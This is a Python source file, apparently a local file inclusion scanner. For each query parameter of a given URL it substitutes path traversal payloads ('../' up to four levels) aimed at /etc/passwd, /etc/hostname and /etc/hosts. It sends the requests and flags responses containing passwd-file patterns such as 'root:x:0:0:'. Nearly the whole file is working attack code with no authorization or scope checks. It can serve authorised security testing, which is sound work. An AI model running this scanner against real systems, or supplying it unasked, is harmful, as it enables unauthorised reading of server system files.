import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse


CANDIDATE_PATHS = [
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
]


def generate_traversal_paths(path: str) -> list[str]:
    """Generate path traversal variants for a candidate file."""

    clean_path = path.lstrip("/")

    return [
        f"../{clean_path}",
        f"../../{clean_path}",
        f"../../../{clean_path}",
        f"../../../../{clean_path}",
    ]


def detect_passwd_evidence(response_text: str) -> list[str]:
    """Return recognizable /etc/passwd indicators found in a response."""

    indicators = [
        "root:x:0:0:",
        "daemon:x:1:1:",
        "www-data:x:",
    ]

    matches = [
        indicator
        for indicator in indicators
        if indicator in response_text
    ]

    return matches


def build_test_url(
    url: str,
    parameter: str,
    payload: str,
) -> str:
    """Replace a URL parameter value with an LFI test payload."""

    parsed = urlparse(url)

    parameters = parse_qsl(
        parsed.query,
        keep_blank_values=True,
    )

    updated_parameters = []

    for key, value in parameters:
        if key == parameter:
            updated_parameters.append((key, payload))
        else:
            updated_parameters.append((key, value))

    query = urlencode(updated_parameters)

    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment,
        )
    )


def detect_parameters(url: str) -> list[str]:
    """Extract query parameters from the target URL."""

    parsed = urlparse(url)

    parameters = parse_qsl(
        parsed.query,
        keep_blank_values=True,
    )

    return [key for key, _ in parameters]


def test_lfi(
    url: str,
    timeout: float = 5.0,
) -> list[dict]:
    """Test URL parameters for possible LFI."""

    parameters = detect_parameters(url)

    if not parameters:
        raise ValueError(
            "No query parameters found. "
            "LFI testing requires a parameter such as ?file=FUZZ."
        )

    findings = []

    for parameter in parameters:

        for candidate_path in CANDIDATE_PATHS:

            traversal_paths = generate_traversal_paths(
                candidate_path
            )

            for traversal in traversal_paths:

                test_url = build_test_url(
                    url,
                    parameter,
                    traversal,
                )

                try:
                    response = requests.get(
                        test_url,
                        timeout=timeout,
                    )

                except requests.RequestException:
                    continue

                evidence_matches = detect_passwd_evidence(
                    response.text
                )

                if len(evidence_matches) >= 2:
                    findings.append(
                        {
                            "parameter": parameter,
                            "candidate": candidate_path,
                            "traversal": traversal,
                            "status": response.status_code,
                            "evidence": (
                                "Linux passwd-file pattern detected"
                            ),
                            "matched": evidence_matches,
                            "confidence": "High",
                            "url": test_url,
                        }
                    )

                    break

    return findings
